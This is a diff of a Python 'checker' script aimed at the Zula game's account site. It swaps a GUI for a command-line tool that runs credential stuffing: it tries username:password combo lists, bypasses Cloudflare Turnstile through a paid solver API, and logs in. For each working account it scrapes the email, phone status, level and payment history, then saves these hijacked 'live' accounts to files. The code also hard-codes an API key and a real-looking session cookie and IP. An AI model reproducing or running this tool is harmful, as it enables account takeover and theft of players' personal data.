@@ -1,346 +1,156 @@
-import sys
-import os
 import asyncio
-import aiohttp
+import uuid,bs4
+import random
+import string
 import json
-from PyQt5.QtWidgets import (
-    QApplication, QMainWindow, QPushButton, QTextEdit, QVBoxLayout, QHBoxLayout,
-    QWidget, QFileDialog, QLabel, QProgressBar, QFrame, QScrollArea
-)
-from PyQt5.QtCore import QThread, pyqtSignal, Qt
-from PyQt5.QtGui import QFont, QPalette, QColor
+import aiohttp
+import time
 from colorama import Fore, init
 
 init(autoreset=True)
 
-CONFIG_FILE = "config.json"
+rapidheaders = {
+    "x-rapidapi-key": "b3f02869f5msh6078c451466020ap10973bjsncabd03b0d35f",
+    "x-rapidapi-host": "turnstile-bypass-api1.p.rapidapi.com",
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+}
 
-def load_config():
-    if not os.path.exists(CONFIG_FILE):
-        default_config = {
-            "rapidapi_key": "your-rapidapi-key-here"
-        }
-        with open(CONFIG_FILE, "w") as f:
-            json.dump(default_config, f, indent=4)
-        print(f"Default config created. Please update {CONFIG_FILE} with your RapidAPI key.")
-        sys.exit(1)
-    with open(CONFIG_FILE, "r") as f:
-        return json.load(f)
+def random_code():
+    p1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
+    p2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
+    p3 = ''.join(random.choices(string.digits, k=10))
+    p4 = ''.join(random.choices(string.digits, k=4))
+    return f"{p1}-{p2}-{p3}-{p4}"
 
-config = load_config()
+def baba_token(token, num_changes=5):
+    token_list = list(token)
+    pchars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
+    
+    for _ in range(num_changes):
+        indx = random.randint(0, len(token_list) - 1)
+        nc = random.choice(pchars)
 
-class WorkerThread(QThread):
-    log_signal = pyqtSignal(str)
+        while token_list[indx] == nc:
+            nc = random.choice(pchars)
+        token_list[indx] = nc
 
-    def __init__(self, combo_file, proxy_file):
-        super().__init__()
-        self.combo_file = combo_file
-        self.proxy_file = proxy_file
+    return ''.join(token_list)
 
-    async def zulu(self, combo, session, proxies):
+with open("proxy.txt", 'r', encoding="utf-8") as f:
+    proxies = f.read().splitlines()
+
+proxy_index = 0
+
+def get_proxy():
+    global proxy_index
+    proxy = proxies[proxy_index]
+    proxy_index = (proxy_index + 1) % len(proxies)
+    return proxy
+
+async def zulu(combo, session):
+    try:
+        user, pas = combo.strip().split(":")
+        if not user or not pas:
+            return 
+    except:
+        return
+
+
+
+    headers = {"Origin": "https://hesap.zulaoyun.com", "Priority": "u=0, i", "Referer": "https://hesap.zulaoyun.com/",
+               "Sec-Ch-Ua": "\"Not)A;Brand\";v=\"99\", \"Opera GX\";v=\"113\", \"Chromium\";v=\"127\"",
+               "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"",
+               "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin",
+               "Sec-Fetch-User": "?1", "Upgrade-Insecure-Requests": "1","cookie":"_gcl_au=1.1.935678524.1746351762; _fbp=fb.1.1746351763419.33488435148126579; ASP.NET_SessionId=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VyTmFtZSI6IlNvZnVvcXM1MyIsIkVtYWlsIjoiIiwiVXNlcklkIjoiN2YxOGJmODMtZWI2Yy00ZWM4LWJiZmQtMTYwY2ZkOWY3N2QzIiwiTmFtZSI6IlNvZnVvcXM1MyIsIkVtYWlsQ29uZmlybWVkIjoiRmFsc2UiLCJzdWIiOiJTb2Z1b3FzNTMiLCJqdGkiOiI0YzgxZGM0ZS03YjA0LTQzNmQtYjlkMi05YjdkN2JlNWMxZTMiLCJQdWJsaXNoZXJJZCI6IjEiLCJleHAiOjE3ODM2MDA1OTEsImlzcyI6Imh0dHBzOi8vaGVzYXAuenVsYW95dW4uY29tIiwiYXVkIjoiaHR0cHM6Ly9oZXNhcC56dWxhb3l1bi5jb20ifQ.9MM4HwSMN808xg6N6Lq_qskSNbb54lZch7ncVcMOyKk; .CurrentCountryCode=TR; .ClientIp=88.238.13.27; .UILanguage=2; .AspNetCore.Session=CfDJ8ERIdbTP73lFu0E25BOEyXrngyBImV4ZX%2BIX%2BvA9ARDq4s2MAu4n%2FMa7UX7y0Stdjthg%2BPSlOUMLGJ2W6B2pYOR62c%2BX6%2FRJcTEMEy0ToMu%2BB4fFRPjiCMoFMzpQHU6YnpJrXjzPldprGVf1rdxnRHME1ZwvYQjXN6ErtbsCgP9p; __cflb=0H28w2gxg3dkESzEdMxNicJdpGh8seSj6vQRYeHsmvc; .AspNetCore.Antiforgery.iwO7S7O7Dh4=CfDJ8ERIdbTP73lFu0E25BOEyXrOmqqF60nGRnk4-ibfQd6Mn1iv537UO78PVIlUwRftwMuyp96C5StoKV1B65O42jO-cp9VwpaMApezUfRwUCiXLPlMhpwhq86Ke89uHawBCZYfSQWzX_G8y7ArlRHTO14; _ga_FM6PLHSKCP=GS2.1.s1747765545$o6$g0$t1747765545$j60$l0$h0$dwhWeo_aedZNVbtr99ps7AM4tTtCpgkGjyQ; _ga=GA1.2.431099491.1746351762; _gid=GA1.2.1490419162.1747765546; _dc_gtm_UA-60166227-1=1; _dc_gtm_UA-60166227-3=1; _ga_X1VHRHNXTN=GS2.2.s1747765546$o5$g0$t1747765546$j60$l0$h0$dIdgnEg2bepWkKqT_5jjb5kRspJxOGAJXvg; cto_bundle=m_xZZl9iQjRLSnBOWlE1UTU1NkVINmtpSFpQR0ZleWVnNFgyJTJGTEpZSEc5REZkOVg3JTJGdmI0N0VBcGl6SnlIJTJGQTNrZjM4SDZQSXU5NlBZWVZOWElGRjVyendtSk1OYzg4V1pLNFB0blVlN3JKSEJTendSTnk5Wno2OHZHRHFpNjNRZ3g2cDRUYVVnaUxnNWtJczR3ZVBlMkdqMFBJYUZrNGxZSXpzMkVhZ3dFSkk2Q2lLUFdmNUVzaE1lWE8wVjNkdnYxSjFCVU9oTG5oNVZ4MGdrTkdBc2ZMTW5RJTNEJTNE",
+               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0"}
+
+    async with session.get("https://hesap.zulaoyun.com/zula-giris-yap", headers=headers) as response:
+        login_data = await response.text()
+        
+        
+    
+    try:
+        token = login_data.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
+    except IndexError:
+        print("token gelmedi")
+        return await zulu(combo, session)
+
+    async with session.post('https://turnstile-bypass-api1.p.rapidapi.com/check',
+                           headers=rapidheaders, json={"url": "https://hesap.zulaoyun.com/zula-giris-yap",
+                                                       "sitekey": "0x4AAAAAAAyOAhZopAtgo73i", "type": "cf"}) as captcha_response:
+        cf = await captcha_response.json()
+        captcha_token = cf.get('captcha_token')
+        if captcha_token is None:
+            print("none geldi")
+            return await zulu(combo, session)
+        print(captcha_token)
+
+    datas = {"__RequestVerificationToken": token, "ReturnUrl": "", "UserName": user, "Password": pas,
+             "cf_turnstile_response": captcha_token, "cf-turnstile-response": captcha_token, "RememberMe": False}
+    
+    async with session.post("https://hesap.zulaoyun.com/zula-giris-yap", headers=headers, allow_redirects=True, data=datas) as final_response:
+        
+       response_text = await final_response.text()
+    if "Kullanıcı adı ya da şifre yanlış." in response_text:
+        return print(Fore.RED + f"{combo} - Kullanıcı adı ya da şifre yanlış.")
+    if int(final_response.status) in [403, 429]:
+        return await zulu(combo, session)
+    
+    async with session.get('https://hesap.zulaoyun.com/profil/duzenle', headers=headers) as profile_response:
+        profile_data = await profile_response.text()
         try:
-            user, pas = combo.strip().split(":")
-            if not user or not pas:
-                return
+            gsmdurum = profile_data.split('id="txtMobilePhoneVerify" placeholder="')[1].split('"')[0]
         except:
-            return
+            gsmdurum = "sanırım yok"
 
-        headers = {
-            "Origin": "https://hesap.zulaoyun.com",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0"
-        }
-
-        async with session.get("https://hesap.zulaoyun.com/zula-giris-yap", headers=headers,proxy=f"http://{proxies}") as response:
-            login_data = await response.text()
-
+    async with session.get("https://hesap.zulaoyun.com/profil/odeme-gecmisi", headers=headers) as payment_response:
+        payment_data = await payment_response.text()
+    async with session.get('https://hesap.zulaoyun.com/profil',headers=headers) as profile_response:
+        profile_data = await profile_response.text()
         try:
-            token = login_data.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
-        except IndexError:
-            self.log_signal.emit(f"{combo} - Token not found response status code: {response.status}")
-            self.log_signal.emit(f"{combo} - Retrying after 10 seconds")
-            await asyncio.sleep(10)
-            return await self.zulu(combo, session, proxies)
+         level = int(profile_data.replace(" ","").split('<divclass="progress-bar-text">')[1].split("</div>")[0].strip())
+        except:
+            level = 0
 
-        rapidheaders = {
-            "x-rapidapi-key": config["rapidapi_key"],
-            "x-rapidapi-host": "turnstile-bypass-api1.p.rapidapi.com",
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-        }
+    soup = bs4.BeautifulSoup(payment_data, 'html.parser').find("div", {"payment-table table-responsive"})
+    print(combo)
+    try:
+        tags = soup.find_all("tr", style="")
+    except:
+        print(f"hatalı {combo}")
+        return
+    try:
+        mail = profile_data.split('id="txtEMailVerify" placeholder="')[1].split('"')[0]
 
-        async with session.post('https://turnstile-bypass-api1.p.rapidapi.com/check',headers=rapidheaders,json={"url": "https://hesap.zulaoyun.com/zula-giris-yap", "sitekey": "0x4AAAAAAAyOAhZopAtgo73i", "type": "cf"}) as captcha_response:
-            cf = await captcha_response.json()
-            captcha_token = cf.get('captcha_token')
-            if captcha_token is None:
-                self.log_signal.emit(f"{combo} - Captcha token not found")
-                return await self.zulu(combo, session, proxies)
-            self.log_signal.emit(f"{combo} - Captcha token received")
+    except:
+        mail="bilmiyom"
+    
 
-        datas = {
-            "__RequestVerificationToken": token,
-            "UserName": user,
-            "Password": pas,
-            "RememberMe": False,
-            "cf_turnstile_response": captcha_token
-        }
+    
+    json_data = json.dumps({"username": user, "password": pas, "seviye": level,
+                             "mailonay": mail,
+                             "teldogr": gsmdurum,
+                             "başarılıişlem": len(tags) - 1}, ensure_ascii=False, indent=4)
 
-        async with session.post("https://hesap.zulaoyun.com/zula-giris-yap", headers=headers, data=datas,proxy=f"http://{proxies}") as final_response:
-            response_text = await final_response.text()
+    fn = f"{int(level // 10) * 10}-{int(level // 10 + 1) * 10}live.txt"
+    print(Fore.GREEN + f"Live var {combo}, capture için {fn} dosyasına bakın.")
 
-        if "Kullanıcı adı ya da şifre yanlış." in response_text:
-            self.log_signal.emit( f"{combo} - Invalid username or password.")
-        else:
-            self.log_signal.emit(f"{combo} - Login successful!")
+    with open(fn, "a", encoding="utf-8") as file:
+        file.write(json_data + "\n")
 
-    async def run_tasks(self):
-        with open(self.combo_file, 'r', encoding="latin") as f:
-            combos = f.read().splitlines()
+    await asyncio.sleep(random.uniform(0.5, 1.5))
 
-        with open(self.proxy_file, 'r', encoding="utf-8") as f:
-            proxies = f.read().splitlines()
+async def run_tasks():
+    combo = open("combo.txt", 'r', encoding="latin").read().splitlines()
 
-        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
-            chunk_size = 7
-            for i in range(0, len(combos), chunk_size):
-                tasks = [self.zulu(combo, session, proxies) for combo in combos[i:i + chunk_size]]
-                await asyncio.gather(*tasks)
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
+        chunk_size = 2
+        for i in range(0, len(combo), chunk_size):
+            tasks = [zulu(x, session) for x in combo[i:i + chunk_size]]
+            await asyncio.gather(*tasks)
 
-    def run(self):
-        asyncio.run(self.run_tasks())
-
-class CustomButton(QPushButton):
-    def __init__(self, text):
-        super().__init__(text)
-        self.setMinimumHeight(45)
-        self.setStyleSheet("""
-            QPushButton {
-                background-color: #2980b9;
-                border: 2px solid #2980b9;
-                color: white;
-                border-radius: 8px;
-                font-size: 15px;
-                font-weight: bold;
-                font-family: 'Segoe UI';
-                padding: 5px 15px;
-            }
-            QPushButton:hover {
-                background-color: #3498db;
-                border: 2px solid #3498db;
-            }
-            QPushButton:pressed {
-                background-color: #2475a8;
-            }
-        """)
-
-class StatsWidget(QFrame):
-    def __init__(self):
-        super().__init__()
-        self.setStyleSheet("""
-            QFrame {
-                background-color: #2c3e50;
-                border: 2px solid #34495e;
-                border-radius: 15px;
-                padding: 15px;
-            }
-            QLabel {
-                color: #ecf0f1;
-                font-size: 16px;
-                font-weight: bold;
-                font-family: 'Segoe UI';
-                padding: 5px;
-            }
-        """)
-        
-        self.layout = QVBoxLayout()
-        self.layout.setSpacing(10)
-        
-        title = QLabel("⚡ CHECKER STATS ⚡")
-        title.setStyleSheet("font-size: 20px; color: #3498db; text-align: center;")
-        title.setAlignment(Qt.AlignCenter)
-        
-        self.total_label = QLabel("📊 Total: 0")
-        self.success_label = QLabel("✅ Success: 0")
-        self.fail_label = QLabel("❌ Failed: 0")
-        
-        self.layout.addWidget(title)
-        for label in [self.total_label, self.success_label, self.fail_label]:
-            self.layout.addWidget(label)
-        
-        self.setLayout(self.layout)
-
-
-class MainWindow(QMainWindow):
-    def __init__(self):
-        super().__init__()
-        self.setWindowTitle("⚡ Zulu Checker Premium author wezaxyy ⚡")
-        self.setGeometry(100, 100, 1200, 800)
-        self.setStyleSheet("""
-            QMainWindow {
-                background-color: #1a1a2e;
-            }
-            QLabel {
-                color: #ecf0f1;
-                font-size: 16px;
-                font-family: 'Segoe UI';
-            }
-        """)
-        
-        
-        main_widget = QWidget()
-        self.setCentralWidget(main_widget)
-        main_layout = QHBoxLayout()
-        main_widget.setLayout(main_layout)
-
-        
-        left_panel = QWidget()
-        left_layout = QVBoxLayout()
-        left_panel.setMaximumWidth(400)
-        left_panel.setLayout(left_layout)
-
-        
-        self.stats = StatsWidget()
-        left_layout.addWidget(self.stats)
-
-        
-        self.combo_label = QLabel("Combo File: Not selected")
-        self.combo_label.setStyleSheet("color: white;")
-        self.combo_button = CustomButton("Choose Combo File")
-        self.combo_button.clicked.connect(self.choose_combo_file)
-
-        self.proxy_label = QLabel("Proxy File: Not selected")
-        self.proxy_label.setStyleSheet("color: white;")
-        self.proxy_button = CustomButton("Choose Proxy File")
-        self.proxy_button.clicked.connect(self.choose_proxy_file)
-
-        self.start_button = CustomButton("Start Checker")
-        self.start_button.clicked.connect(self.start_process)
-
-        for widget in [self.combo_label, self.combo_button, 
-                      self.proxy_label, self.proxy_button,
-                      self.start_button]:
-            left_layout.addWidget(widget)
-
-        left_layout.addStretch()
-        main_layout.addWidget(left_panel)
-
-        
-        right_panel = QWidget()
-        right_layout = QVBoxLayout()
-        right_panel.setLayout(right_layout)
-
-        
-        self.results_label = QLabel("🔍 CHECKER RESULTS")
-        self.results_label.setStyleSheet("""
-            color: #3498db;
-            font-size: 22px;
-            font-weight: bold;
-            font-family: 'Segoe UI';
-            padding: 10px;
-        """)
-        right_layout.addWidget(self.results_label)
-
-        self.log_area = QTextEdit()
-        self.log_area.setReadOnly(True)
-        self.log_area.setStyleSheet("""
-            QTextEdit {
-                background-color: #2c3e50;
-                color: #ecf0f1;
-                border: 2px solid #34495e;
-                border-radius: 15px;
-                padding: 15px;
-                font-family: 'Consolas';
-                font-size: 14px;
-            }
-        """)
-        right_layout.addWidget(self.log_area)
-
-        
-        self.live_label = QLabel("💎 LIVE ACCOUNTS")
-        self.live_label.setStyleSheet("""
-            color: #2ecc71;
-            font-size: 22px;
-            font-weight: bold;
-            font-family: 'Segoe UI';
-            padding: 10px;
-        """)
-        right_layout.addWidget(self.live_label)
-
-        self.live_area = QTextEdit()
-        self.live_area.setReadOnly(True)
-        self.live_area.setStyleSheet("""
-            QTextEdit {
-                background-color: #27ae60;
-                color: white;
-                border: 2px solid #2ecc71;
-                border-radius: 15px;
-                padding: 15px;
-                font-family: 'Consolas';
-                font-size: 14px;
-            }
-        """)
-        right_layout.addWidget(self.live_area)
-
-        main_layout.addWidget(right_panel)
-
-        
-        self.combo_file = None
-        self.proxy_file = None
-        self.worker_thread = None
-        self.success_count = 0
-        self.fail_count = 0
-
-    def choose_combo_file(self):
-        options = QFileDialog.Options()
-        file, _ = QFileDialog.getOpenFileName(self, "Select Combo File", "", 
-                                            "Text Files (*.txt);;All Files (*)", options=options)
-        if file:
-            self.combo_file = file
-            self.combo_label.setText(f"Combo File: {os.path.basename(file)}")
-
-    def choose_proxy_file(self):
-        options = QFileDialog.Options()
-        file, _ = QFileDialog.getOpenFileName(self, "Select Proxy File", "", 
-                                            "Text Files (*.txt);;All Files (*)", options=options)
-        if file:
-            self.proxy_file = file
-            self.proxy_label.setText(f"Proxy File: {os.path.basename(file)}")
-
-    def update_log(self, message):
-        if "Login successful" in message:
-            self.success_count += 1
-            formatted_msg = f"✅ {message}"
-            self.live_area.append(formatted_msg)
-        elif "Invalid username or password" in message:
-            self.fail_count += 1
-            formatted_msg = f"❌ {message}"
-        else:
-            formatted_msg = f"ℹ️ {message}"
-        
-        self.log_area.append(formatted_msg)
-        self.stats.success_label.setText(f"✅ Success: {self.success_count}")
-        self.stats.fail_label.setText(f"❌ Failed: {self.fail_count}")
-        
-    def start_process(self):
-        if not self.combo_file or not self.proxy_file:
-            self.log_area.append("Please select both combo and proxy files first.")
-            return
-
-        self.success_count = 0
-        self.fail_count = 0
-        self.log_area.clear()
-        self.live_area.clear()
-        
-        with open(self.combo_file, 'r') as f:
-            total_lines = sum(1 for line in f)
-        self.stats.total_label.setText(f"Total: {total_lines}")
-        
-        self.worker_thread = WorkerThread(self.combo_file, self.proxy_file)
-        self.worker_thread.log_signal.connect(self.update_log)
-        self.worker_thread.start()
 
 
 if __name__ == "__main__":
-    app = QApplication(sys.argv)
-    window = MainWindow()
-    window.show()
-    sys.exit(app.exec_())
+    asyncio.run(run_tasks())
